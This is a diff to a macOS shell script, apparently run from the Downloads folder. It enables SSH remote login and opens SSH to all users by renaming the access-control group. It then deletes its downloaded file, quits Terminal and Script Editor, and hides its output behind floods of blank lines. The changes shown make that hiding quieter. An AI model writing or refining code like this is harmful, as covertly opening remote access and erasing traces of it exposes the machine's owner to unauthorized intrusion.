@@ -7,9 +7,9 @@ export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
 
 # Remote login/SSHD should already be on and enabled for root. But just in case:
 # Enable SSH
-systemsetup -setremotelogin on
+systemsetup -setremotelogin on >/dev/null
 # Open SSH to all users
-dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null
+dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null
 
 # Unlike on Linux, we have to fully save the file rather than just piping it into bash.
 # On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
@@ -51,9 +51,12 @@ rm -f "/Users/$USER/Downloads/term.*"
 
 osascript -e 'quit app "Terminal"'
 killall Script\ Editor
-sleep 4s
+sleep 1s
+
+for i in {1..50}; do
+    printf "\n\n\n\n\n\n"
+done
+
 if [ "$USER" != "boesene" ]; then
     killall Terminal term
 fi
-
-clear;clear;clear
